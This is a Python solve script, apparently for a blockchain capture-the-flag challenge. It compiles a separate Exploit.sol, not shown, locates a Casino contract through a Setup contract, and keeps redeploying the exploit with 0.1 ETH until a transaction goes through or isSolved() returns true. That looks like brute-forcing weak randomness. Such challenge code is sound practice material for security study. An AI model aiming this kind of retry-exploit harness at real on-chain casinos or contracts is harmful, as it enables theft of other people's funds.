import time
import sys
from web3 import Web3
from solcx import compile_source, install_solc

def solve():
    if len(sys.argv) < 4:
        print("Usage: python3 solve.py <RPC_URL> <PRIVATE_KEY> <SETUP_ADDRESS>")
        print("Example: python3 solve.py http://... 0x... 0x...")
        return

    rpc_url = sys.argv[1]
    private_key = sys.argv[2]
    setup_address = sys.argv[3]

    w3 = Web3(Web3.HTTPProvider(rpc_url))
    if not w3.is_connected():
        print("Failed to connect to RPC")
        return

    account = w3.eth.account.from_key(private_key)
    print(f"Attacker address: {account.address}")
    print(f"Balance: {w3.eth.get_balance(account.address)}")

    # Compile Exploit.sol
    print("Compiling Exploit.sol...")
    try:
        install_solc('0.8.20')
    except Exception as e:
        print(f"Error installing solc: {e}")
        # Try continuing if already installed
    
    with open('Exploit.sol', 'r') as f:
        source = f.read()
    
    compiled = compile_source(
        source,
        output_values=['abi', 'bin'],
        solc_version='0.8.20'
    )
    
    contract_id, contract_interface = list(compiled.items())[0]
    bytecode = contract_interface['bin']
    abi = contract_interface['abi']

    # Get Casino address from Setup
    setup_abi = [
        {
            "inputs": [],
            "name": "casino",
            "outputs": [{"internalType": "contract Casino", "name": "", "type": "address"}],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "isSolved",
            "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
            "stateMutability": "view",
            "type": "function"
        }
    ]
    
    setup_contract = w3.eth.contract(address=setup_address, abi=setup_abi)
    casino_address = setup_contract.functions.casino().call()
    print(f"Casino address: {casino_address}")

    # Deploy Exploit loop
    Exploit = w3.eth.contract(abi=abi, bytecode=bytecode)
    
    print("Attempting to exploit...")
    
    while True:
        if setup_contract.functions.isSolved().call():
            print("SOLVED!")
            break
            
        # We need to send some ETH to buy luck.
        value_to_send = w3.to_wei(0.1, 'ether')
        
        nonce = w3.eth.get_transaction_count(account.address)
        
        try:
            print(f"Trying nonce {nonce}...")
            tx = Exploit.constructor(casino_address).build_transaction({
                'from': account.address,
                'nonce': nonce,
                'value': value_to_send,
                'gas': 5000000,
                'gasPrice': w3.eth.gas_price
            })
            
            signed_tx = w3.eth.account.sign_transaction(tx, private_key)
            tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
            print(f"Sent tx: {tx_hash.hex()}")
            
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            
            if receipt.status == 1:
                print("Exploit executed successfully!")
                break
            else:
                print("Tx reverted (bad luck), retrying...")
                
        except Exception as e:
            print(f"Error: {e}")
            print("Retrying...")
            time.sleep(1)

if __name__ == "__main__":
    solve()
